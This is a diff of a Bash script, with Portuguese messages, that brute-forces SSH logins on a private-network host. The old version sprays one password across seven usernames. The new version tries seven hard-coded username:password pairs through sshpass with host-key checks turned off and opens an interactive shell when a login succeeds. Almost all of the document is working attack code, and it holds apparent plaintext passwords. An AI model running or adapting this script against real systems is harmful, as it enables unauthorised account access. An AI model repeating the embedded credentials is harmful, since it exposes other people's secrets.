@@ -1,107 +1,90 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-SSH_BIN="${SSH_BIN:-/tmp/openssh-root/usr/bin/ssh}"
 TARGET="${1:-10.20.20.57}"
-REMOTE_CMD="${2:-whoami}"
-MAX_PROMPTS="${MAX_PROMPTS:-3}"
+SSH_BIN="${SSH_BIN:-/tmp/openssh-root/usr/bin/ssh}"
+LOG_FILE="${LOG_FILE:-/tmp/ssh_pair_test_$(date +%F_%H%M%S).log}"
 
-USERS=(
-  "jonasf"
-  "nickj"
-  "joshuaa"
-  "joaos"
-  "leonardz"
-  "anneh"
-  "dmitrip"
+# Teste 1:1 com pares conhecidos (sem combinacao cruzada).
+PAIRS=(
+  "jonasf:minecraft123"
+  "nickj:ZeqlcR2!4gN"
+  "joshuaa:QW5al7oPN2-1"
+  "joaos:F147-0356agipV"
+  "leonardz:averylongpasswordfornohackertodiscover"
+  "anneh:VSZ785-aWB15#q"
+  "dmitrip:42W#wskb-62wA\$sc"
 )
 
 if [[ ! -x "${SSH_BIN}" ]]; then
   echo "[!] SSH nao encontrado em ${SSH_BIN}"
-  echo "[i] Ajuste com: export SSH_BIN=/tmp/openssh-root/usr/bin/ssh"
+  echo "[i] Ajusta com: export SSH_BIN=/tmp/openssh-root/usr/bin/ssh"
   exit 1
 fi
 
-if ! command -v setsid >/dev/null 2>&1; then
-  echo "[!] comando 'setsid' nao encontrado."
-  echo "[i] Sem setsid o SSH_ASKPASS sem TTY pode falhar."
+if ! command -v script >/dev/null 2>&1; then
+  echo "[!] comando 'script' nao encontrado."
   exit 1
 fi
 
-read -r -s -p "Senha para testar em todos os usuarios: " PASSWORD
-echo
-
-if [[ -z "${PASSWORD}" ]]; then
-  echo "[!] Senha vazia. Abortando."
+if ! command -v sshpass >/dev/null 2>&1; then
+  echo "[!] comando 'sshpass' nao encontrado."
+  echo "[i] Instala com: sudo apt install sshpass"
   exit 1
 fi
 
-ASKPASS_FILE="/tmp/.askpass_all_users_$$.sh"
-cleanup() {
-  rm -f "${ASKPASS_FILE}"
+touch "${LOG_FILE}" 2>/dev/null || LOG_FILE="/tmp/ssh_pair_test_fallback_$(date +%F_%H%M%S).log"
+touch "${LOG_FILE}" 2>/dev/null || {
+  echo "[!] Sem permissao para criar log. Vai rodar sem log em arquivo."
+  LOG_FILE="/dev/null"
 }
-trap cleanup EXIT
 
-cat >"${ASKPASS_FILE}" <<EOF
-#!/usr/bin/env sh
-printf '%s\n' '${PASSWORD}'
-EOF
-chmod 700 "${ASKPASS_FILE}"
+echo "[*] Target: ${TARGET}" | tee -a "${LOG_FILE}"
+echo "[*] SSH_BIN: ${SSH_BIN}" | tee -a "${LOG_FILE}"
+echo "[*] Log: ${LOG_FILE}" | tee -a "${LOG_FILE}"
+echo "" | tee -a "${LOG_FILE}"
 
-echo "[*] Alvo: ${TARGET}"
-echo "[*] Comando remoto de teste: ${REMOTE_CMD}"
-echo "[*] Tentativas por usuario: ${MAX_PROMPTS}"
-echo
+for pair in "${PAIRS[@]}"; do
+  user="${pair%%:*}"
+  pass="${pair#*:}"
+  attempt_log="/tmp/ssh_pair_attempt_${user}_$$.log"
 
-FOUND_USER=""
-for user in "${USERS[@]}"; do
-  echo "[*] Testando ${user}@${TARGET} ..."
+  echo "[*] Testando ${user} (1:1)" | tee -a "${LOG_FILE}"
+  echo "[i] Enviando senha automaticamente para ${user}" | tee -a "${LOG_FILE}"
+
+  # Usa 'script' para forcar pseudo-tty no ambiente atual.
+  # Executa comando curto para validar autenticacao.
   set +e
-  output="$(
-    DISPLAY=:0 SSH_ASKPASS="${ASKPASS_FILE}" SSH_ASKPASS_REQUIRE=force \
-      setsid "${SSH_BIN}" \
-        -o StrictHostKeyChecking=no \
-        -o UserKnownHostsFile=/dev/null \
-        -o PreferredAuthentications=password \
-        -o PubkeyAuthentication=no \
-        -o NumberOfPasswordPrompts="${MAX_PROMPTS}" \
-        -o ConnectTimeout=6 \
-        "${user}@${TARGET}" "${REMOTE_CMD}" 2>&1
-  )"
+  script -q -c "SSHPASS='${pass}' sshpass -e ${SSH_BIN} \
+    -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    -o PreferredAuthentications=password \
+    -o PubkeyAuthentication=no \
+    -o ConnectTimeout=5 \
+    ${user}@${TARGET} 'whoami'" /dev/null >"${attempt_log}" 2>&1
   rc=$?
   set -e
 
-  if [[ ${rc} -eq 0 ]]; then
-    echo "[+] SUCESSO: senha valida para ${user}"
-    echo "[i] Saida remota:"
-    echo "${output}"
-    FOUND_USER="${user}"
-    break
-  fi
+  cat "${attempt_log}" | tee -a "${LOG_FILE}" >/dev/null
 
-  if printf '%s' "${output}" | grep -qi "Permission denied"; then
-    echo "[-] Falhou para ${user} (senha invalida)."
-  else
-    echo "[!] Inconclusivo para ${user} (rc=${rc})."
-    echo "${output}"
-  fi
-  echo
-done
-
-if [[ -z "${FOUND_USER}" ]]; then
-  echo "[-] Nenhum usuario autenticou com essa senha."
-  exit 1
-fi
-
-echo
-read -r -p "Abrir sessao interativa com ${FOUND_USER}? [s/N]: " OPEN_INTERACTIVE
-if [[ "${OPEN_INTERACTIVE}" =~ ^[sS]$ ]]; then
-  exec env DISPLAY=:0 SSH_ASKPASS="${ASKPASS_FILE}" SSH_ASKPASS_REQUIRE=force \
-    setsid "${SSH_BIN}" -tt \
+  if grep -qi "Permission denied" "${attempt_log}"; then
+    echo "[-] Falhou para ${user}" | tee -a "${LOG_FILE}"
+  elif [[ ${rc} -eq 0 ]]; then
+    echo "[+] Possivel sucesso para ${user}" | tee -a "${LOG_FILE}"
+    echo "[+] Abrindo sessao interativa..." | tee -a "${LOG_FILE}"
+    exec SSHPASS="${pass}" sshpass -e "${SSH_BIN}" \
       -o StrictHostKeyChecking=no \
       -o UserKnownHostsFile=/dev/null \
       -o PreferredAuthentications=password \
       -o PubkeyAuthentication=no \
-      "${FOUND_USER}@${TARGET}"
-fi
+      "${user}@${TARGET}"
+  else
+    echo "[!] Resultado inconclusivo para ${user} (rc=${rc})" | tee -a "${LOG_FILE}"
+  fi
 
+  rm -f "${attempt_log}"
+  echo "" | tee -a "${LOG_FILE}"
+done
+
+echo "[-] Nenhum par validado com sucesso."
+echo "[i] Revisa o log: ${LOG_FILE}"
